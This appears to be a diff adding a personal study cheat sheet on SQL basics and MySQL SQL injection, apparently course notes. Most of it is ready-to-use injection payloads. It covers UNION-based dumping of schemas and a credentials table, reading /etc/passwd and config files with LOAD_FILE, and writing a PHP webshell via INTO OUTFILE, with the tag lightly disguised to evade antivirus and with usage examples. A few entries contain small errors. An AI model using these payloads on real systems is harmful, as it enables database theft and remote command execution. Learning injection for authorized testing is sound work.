@@ -1,0 +1,208 @@
+=================================
+!!! No.1 Rule of finding SQLi !!!
+!!! === CONTEXT  MATTERS! === !!!
+=================================
+
+QUICK LIST OF MYSQL THINGS TO 'SELECT' COMMAND:
+@@version
+@@datadir
+SQL databases must follow: https://en.wikipedia.org/wiki/ISO/IEC_9075
+
+RELATIONAL DATABASES
+- Associated with keys
+- Tables are related to each other
+- Can link the id to multiple tables
+
+
+NON-RELATIONAL DATABASES
+- AKA NoSQL Database
+- Best for storing non-structures datasets
+- 4 common storage models:
+		- Key-Value (stores data in JSON or XML, with a key/id and the content)
+		- Document-based
+		- Wide-column
+		- Graph
+
+
+SQL FUNDAMENTALS:
+- PRIMARY KEY (id) 		- Sets the 'main' id row
+- INSERT INTO <tablename> VALUES <col1, col2, ...> 		- Insert sttmnt adds new data
+- INSERT INTO logins(username, password) VALUES ('bingus', 'adm1n_pas$'); ^
+- SELECT * FROM table_name;		- Shows all in table
+- DROP TABLE logins			- DROP statement will remove tables and databases
+- ALTER TABLE logins ADD newColumn INT;		- ALTER sttmnt changges table properties
+- UPDATE table_name SET column1=newValue1,...; 		- Updates records in a table
+- SELECT * FROM logins ORDER BY password; 		- ORDER BY sorts queries
+- LIMIT 5 				- appended to a command, LIMIT will limit row amount
+- SELECT * FROM table_name WHERE <condition>		- fine-tuning results using WHERE
+- SELECT * FROM logins WHERE username LIKE 'admin';		- LIKE pattern matching
+
+
+LOGICAL OPERATORS:
+- SELECT 1 = 1 AND 'bingus' = 'bingus';			- AND 		&&
+- SELECT 1 = 1 AND 'bingus' = 'bingus';			- OR 		||
+- SELECT NOT 1 = 1;								- NOT 		!
+
+
+ In-band SQL injection
+  - Description: The application's response contains the query output directly, so results can be read from the front end.
+  - Types:
+    - Union Based: Directs query output into an existing column (must identify a readable column).
+    - Error Based: Causes SQL/PHP errors that leak query output in the front-end error messages.
+
+- Blind SQL injection
+  - Description: Query output is not directly visible; data is extracted indirectly, often character-by-character.
+  - Types:
+    - Boolean Based: Uses conditional statements to change the page response depending on a true/false condition (detect via original response).
+    - Time Based: Uses conditional statements that delay the response (e.g., SLEEP()) to indicate true/false.
+
+- Out-of-band (OOB) SQL injection
+  - Description: When direct output is unavailable, the injected payload causes the database/server to send results to a remote location (e.g., DNS), which is then retrieved externally.
+
+
+  SQLi Discovery:
+
+  Test one of the following inputs to see if SQLi will work:
+  (note that the one on the right is the URL encoded version)
+  - '			%27
+  - "			%22
+  - #			%23
+  - ;			%3B
+  - )			%29
+
+
+  ^ it is successful if an error appears on the response.
+
+
+OR INJECTION:
+(this will return true if username ADMIN exists)
+SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
+
+COMMENT INJECTION:
+The way to comment is -- OR #
+
+
+UNION CLAUSE:
+Used to combine results from multiple SELECT statemeents!
+Can only be used on tables with the same number of columns.
+
+(example)
+SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
+UNION SELECT username, 2, 3, 4 from passwords;
+
+For uneven column, you can 'fill' the empty columns with junk ones^
+(to fill with placeholders, select all columns then add ,1,2,3,4,etc to add cols)
+
+
+DETECTING NUMBER OF COLUMNS USING ORDER BY:
+order by 1--
+order by 2--
+...
+order by 101--
+(keep doing this until you get an error)
+
+
+^ USING UNION TO PRINT RESULTS FROM COLUMN #:
+UNION SELECT 1,2,3,4-- (last column should be the # of columns in the table)
+
+GET USERS PRESENT IN A DATABASE:
+SELECT* FROM my_database.users;
+
+
+OTHER DATA EXFILTRATION COMMANDS:
+(ex. used like UNION SELECT 1,@@version,3,4 )
+@@version
+user()
+
+
+================================
+INFORMATION_SCHEMA DATABASE:
+This database contains metadata about the databases and tables present on the server
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
+Or in SQL injection form:
+' UNION SELECT 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA; --
+
+
+EXFILTRATING TABLE INFORMATION (table_name):
+' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='dev' --
+
+EXFILTRATING COLUMN INFORMATION:
+' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA='dev'--
+
+
+EXFILTRATING DATA FROM TABLES:
+(example is for a table called 'credentials' in a database called 'dev')
+'UNION select 1, username, password, 4 from dev.credentials--
+
+
+CHECKING IF WE ARE DBA:
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+or SQLi:
+' UNION SELECT 1, user(), 3, 4--
+' UNION SELECT 1, user, 3, 4 from mysql.user-- 
+
+
+CHECKING USER PRIVILEGES:
+(example for user named 'super_priv')
+SELECT super_priv FROM mysql.user
+or
+'UNION SELECT 1, super_priv, 3, 4 FROM mysql.user--
+
+Showing all privs for root@localhost:
+' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"--
+
+
+READING FILES ON THE SYSTEM USING LOAD_FILE:
+SELECT LOAD_FILE('/etc/passwd');
+or
+' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4--
+
+returns file contents:
+SELECT LOAD_FILE('/var/www/html/includes/config.php') AS file_text;
+
+
+WRITING FILES:
+
+First you need:
+- User w/ FILE privilege
+- MySQL global secure_file_priv variable NOT enables
+- Write access to location we wish to write to
+
+SECURE_FILE_PRIV
+secure_file_priv is a variable to determine where to read/write files from; empty value means that we can read the ENTIRE system, NULL means no read/write from any directory.
+
+To view this variable:
+SHOW VARIABLES LIKE 'secure_file_priv';
+or
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+
+EXPORTING DATA USING INTO OUTFILE:
+example:
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+
+OR WRITING INTO A FILE USING INTO OUTFILE:
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+
+WRITING A WEBSHELL THROUGH SQL INJECTION:
+(replace pee aych pee with the real deal--windows defender doesn't like it)
+' union select "",'<?pEEaYCHpEE system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'--
+
+^ find the /shell.php, then write as /shell.php?0=<command>
+examples:
+/shell.php?0=whoami
+/shell.php?0='cd ../../.. && ls'
+
+
+
+================================
+== DANK PREFIXES ==
+===================
+
+One I didn't expect:
+admin')
+
+^ formatted like <username>')
+(This assumes that the input checks for )
